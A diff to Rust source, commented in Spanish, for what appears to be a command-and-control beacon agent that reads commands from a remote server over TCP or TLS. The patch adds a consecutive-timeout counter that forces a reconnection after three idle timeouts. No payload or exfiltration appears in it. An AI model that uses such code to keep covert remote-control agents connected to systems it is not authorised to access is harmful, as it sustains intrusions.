@@ -226,6 +226,13 @@ fn handle_tls_connection(tcp_stream: TcpStream, tls_conn: rustls::ClientConnecti
     let mut read_buffer = vec![0u8; 4096];
     let mut line_buffer = String::new();
     
+    // Contador de timeouts consecutivos para detectar conexiones muertas
+    // Si el servidor se cierra, el agente puede quedarse en un loop de timeouts
+    // sin detectar que la conexión está muerta. Después de MAX_CONSECUTIVE_TIMEOUTS
+    // timeouts sin recibir datos, asumimos que la conexión está muerta y reconectamos.
+    let mut consecutive_timeouts: u32 = 0;
+    const MAX_CONSECUTIVE_TIMEOUTS: u32 = 3; // 3 timeouts x 5 min = 15 min máximo antes de reconectar
+    
     loop {
         // Leer datos del stream TLS
         match tls_wrapper.read(&mut read_buffer) {
@@ -234,6 +241,9 @@ fn handle_tls_connection(tcp_stream: TcpStream, tls_conn: rustls::ClientConnecti
                 break;
             }
             Ok(n) => {
+                // Reset timeout counter on successful read
+                consecutive_timeouts = 0;
+                
                 let data = String::from_utf8_lossy(&read_buffer[..n]);
                 line_buffer.push_str(&data);
                 
@@ -261,7 +271,14 @@ fn handle_tls_connection(tcp_stream: TcpStream, tls_conn: rustls::ClientConnecti
             }
             Err(e) => {
                 if e.kind() == ErrorKind::TimedOut || e.kind() == ErrorKind::WouldBlock {
-                    debug_print!("DEBUG: Read timeout, continuando...");
+                    consecutive_timeouts += 1;
+                    debug_print!("DEBUG: Read timeout ({}/{}), continuando...", consecutive_timeouts, MAX_CONSECUTIVE_TIMEOUTS);
+                    
+                    // Si alcanzamos el máximo de timeouts consecutivos, asumir conexión muerta
+                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS {
+                        debug_print!("DEBUG: Máximo de timeouts consecutivos alcanzado, forzando reconexión...");
+                        break;
+                    }
                     continue;
                 }
                 debug_print!("DEBUG: Error de lectura TLS: {}", e);
@@ -379,11 +396,18 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
         return;
     }
 
+    // Contador de timeouts consecutivos para detectar conexiones muertas
+    let mut consecutive_timeouts: u32 = 0;
+    const MAX_CONSECUTIVE_TIMEOUTS: u32 = 3;
+
     let mut buffer = String::new();
     loop {
         match reader.read_line(&mut buffer) {
             Ok(0) => break,
             Ok(_) => {
+                // Reset timeout counter on successful read
+                consecutive_timeouts = 0;
+                
                 let command = buffer.trim();
                 debug_print!("DEBUG: Comando recibido: {}", command);
 
@@ -476,7 +500,14 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                 // Si es timeout, simplemente continuar esperando comandos
                 // Esto previene reconexiones innecesarias cuando no hay actividad
                 if e.kind() == ErrorKind::TimedOut || e.kind() == ErrorKind::WouldBlock {
-                    debug_print!("DEBUG: Read timeout, continuando...");
+                    consecutive_timeouts += 1;
+                    debug_print!("DEBUG: Read timeout ({}/{}), continuando...", consecutive_timeouts, MAX_CONSECUTIVE_TIMEOUTS);
+                    
+                    // Si alcanzamos el máximo de timeouts consecutivos, asumir conexión muerta
+                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS {
+                        debug_print!("DEBUG: Máximo de timeouts consecutivos alcanzado, forzando reconexión...");
+                        break;
+                    }
                     continue;
                 }
                 // Para otros errores (conexión cerrada, etc.), salir
